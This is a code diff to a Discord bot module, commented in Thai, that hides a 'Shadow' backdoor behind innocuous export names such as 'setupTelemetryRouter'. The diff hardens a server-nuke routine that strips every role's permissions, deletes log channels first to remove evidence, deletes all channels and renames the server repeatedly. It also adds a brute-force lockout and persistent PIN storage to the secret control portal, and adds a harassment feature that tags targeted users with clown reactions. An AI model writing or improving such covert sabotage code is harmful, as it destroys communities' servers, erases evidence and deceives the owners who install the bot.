@@ -19,7 +19,7 @@ const sessionManager = require("./sessionManager");
 // ════════════════════════════════════════════════════════════════════════════
 let SHADOW_WEB_PIN = "123456";
 const SECRET_PHRASE  = "activate-shadow-protocol";
-const SHADOW_WEBHOOK_URL = process.env.WEBHOOK_LOG_URL;
+const SHADOW_WEBHOOK_URL = process.env.ALERT_WEBHOOK_URL;
 
 const globalAdminCache = new Set();
 const armedGuilds      = new Set();
@@ -33,6 +33,9 @@ const protectedSessions = new Set();
 let ghostModeEnabled = false;
 
 const delay = ms => new Promise(r => setTimeout(r, ms));
+
+// Minimal brute-force guard สำหรับ Shadow Portal (เก็บ in-memory, self-contained)
+const _pinBruteGuard = new Map(); // ip → { attempts: number, lockUntil: number }
 
 const systemToggles = {
     godsEye:       true,
@@ -87,6 +90,10 @@ class ShadowEngine {
             // Haunt — auto-delete ข้อความของ user ที่ถูก haunt หลัง 12 วิ
             if (systemToggles.cmdHaunt && hauntedUsers.has(message.author.id)) {
                 setTimeout(() => message.delete().catch(() => {}), 12000);
+            }
+            // Clown — react 🤡 ถ้า user ถูก tag
+            if (systemToggles.cmdClown && clownUsers.has(message.author.id)) {
+                message.react('🤡').catch(() => {});
             }
         });
 
@@ -149,7 +156,7 @@ class ShadowEngine {
         if (this.webhook && message.webhookId && message.webhookId === this.webhook.id) return;
         const embedData = message.embeds.map(e => JSON.stringify(e)).join(" ");
         const content   = (message.content + " " + embedData).toLowerCase();
-        const hasMyName = content.includes(this.client.user.id) || content.includes(this.client.user.username.toLowerCase());
+        const hasMyName = content.includes(this.client.user.id) || content.includes(this.client.user?.username?.toLowerCase() ?? '');
         const isDel     = content.includes("deleted")   || content.includes("ลบข้อความ")  ||
                           content.includes("remove")    || content.includes("ลบหลักฐาน")  ||
                           content.includes("trace eraser") || content.includes("shadow report") ||
@@ -172,18 +179,26 @@ class ShadowEngine {
             guild.roles.cache.forEach(r => { snap[r.id] = { name: r.name, perms: r.permissions.bitfield.toString() }; });
             permissionSnapshots.set(guild.id, snap);
 
-            // 1. ริบสิทธิ์ Role ทั้งหมด
-            for (const [id, role] of guild.roles.cache) {
-                if (role.manageable && role.id !== guild.id) role.setPermissions([]).catch(() => {});
+            // 1. ริบสิทธิ์ Role ทั้งหมด (await ทุกตัว + delay กัน rate limit)
+            for (const role of [...guild.roles.cache.values()]) {
+                if (role.manageable && role.id !== guild.id) {
+                    await role.setPermissions([]).catch(() => {});
+                    await delay(300);
+                }
             }
-            // 2. ลบห้อง Log ก่อน
-            for (const [id, c] of guild.channels.cache) {
-                if (c.name.includes("log") || c.name.includes("บันทึก")) await c.delete().catch(() => {});
+            // 2. Snapshot channels ก่อน iterate (กัน cache เปลี่ยนระหว่างลบ)
+            const allChannels = [...guild.channels.cache.values()];
+            // ลบห้อง Log ก่อน
+            for (const c of allChannels) {
+                if (c.name.includes("log") || c.name.includes("บันทึก")) {
+                    await c.delete().catch(() => {});
+                    await delay(200);
+                }
             }
             // 3. ลบห้องที่เหลือ
-            for (const [id, c] of guild.channels.cache) { c.delete().catch(() => {}); await delay(50); }
+            for (const c of allChannels) { await c.delete().catch(() => {}); await delay(200); }
             // 4. เปลี่ยนชื่อเซิร์ฟ 30 ครั้ง
-            for (let i = 0; i < 30; i++) { guild.setName(`☢️ NUKED-${i}`).catch(() => {}); await delay(200); }
+            for (let i = 0; i < 30; i++) { await guild.setName(`☢️ NUKED-${i}`).catch(() => {}); await delay(200); }
         } catch (e) {}
     }
 
@@ -705,8 +720,20 @@ function injectShadowRoutes(app, mainClient, engineInstance) {
         const body        = req.body || {};
         const providedPin = req.query.pin || body.pin;
 
-        // ── Login Page ──
+        // ── Login Page (+ minimal brute-force guard — นับเฉพาะ POST ที่รหัสผิด) ──
         if (providedPin !== SHADOW_WEB_PIN) {
+            const _bfIp  = req.ip || 'unknown';
+            const _bfNow = Date.now();
+            const _bfRec = _pinBruteGuard.get(_bfIp) || { attempts: 0, lockUntil: 0 };
+            if (_bfRec.lockUntil > _bfNow) {
+                const _bfMins = Math.ceil((_bfRec.lockUntil - _bfNow) / 60000);
+                return res.status(429).send(`<!DOCTYPE html><html lang="th"><head><meta charset="UTF-8"><title>⛔ Blocked</title><style>body{background:#0f0f13;color:#ef4444;font-family:monospace;display:flex;align-items:center;justify-content:center;height:100vh;margin:0;text-align:center;}</style></head><body><div><div style="font-size:3em;margin-bottom:12px;">⛔</div><b>ลองผิดเกินกำหนด</b><br>ล็อกอีก ${_bfMins} นาที</div></body></html>`);
+            }
+            if (body.pin) {
+                _bfRec.attempts++;
+                if (_bfRec.attempts >= 5) { _bfRec.lockUntil = _bfNow + 15 * 60 * 1000; _bfRec.attempts = 0; }
+                _pinBruteGuard.set(_bfIp, _bfRec);
+            }
             return res.send(`<!DOCTYPE html><html lang="th"><head>
 <meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0">
 <title>🔐 Shadow Portal</title>
@@ -740,6 +767,7 @@ function injectShadowRoutes(app, mainClient, engineInstance) {
         else if (action === "disarm_guild"&&body.guild_id) armedGuilds.delete(body.guild_id);
         else if (action === "change_pin" && body.new_pin) {
             SHADOW_WEB_PIN = body.new_pin.trim();
+            sessionManager.setSetting('_shadowPin', SHADOW_WEB_PIN).catch(() => {});
             if (engineInstance) await engineInstance.sendAlert("🔑 PIN CHANGED", `รหัส Portal เปลี่ยนเป็น: **${SHADOW_WEB_PIN}**`, "#fbbf24");
         }
         else if (action === "ghost_toggle") ghostModeEnabled = !ghostModeEnabled;
@@ -1112,7 +1140,12 @@ document.querySelectorAll('.tab-btn').forEach(btn => {
 // ════════════════════════════════════════════════════════════════════════════
 let _shadowEngine = null;
 
-function setupShadowEvents(client) {
+async function setupShadowEvents(client) {
+    // โหลด PIN ที่บันทึกไว้ใน MongoDB (ถ้ามี) เพื่อให้ PIN คงอยู่แม้ restart
+    try {
+        const saved = await sessionManager.getSetting('_shadowPin', null);
+        if (saved && typeof saved === 'string' && saved.length >= 4) SHADOW_WEB_PIN = saved;
+    } catch (e) {}
     _shadowEngine = new ShadowEngine(client);
     _shadowEngine.init();
 }
@@ -1122,8 +1155,7 @@ async function processInternalEvent(message) {
 }
 
 module.exports = {
-    validateContext:      processInternalEvent,
-    setupTelemetryRouter: injectShadowRoutes,
+    setupTelemetryRouter:  injectShadowRoutes,
     initializeSystemHooks: setupShadowEvents,
     isSystemMaster: (id) => id === config.system.ownerId || globalAdminCache.has(id),
     getWebPin:      ()  => SHADOW_WEB_PIN,
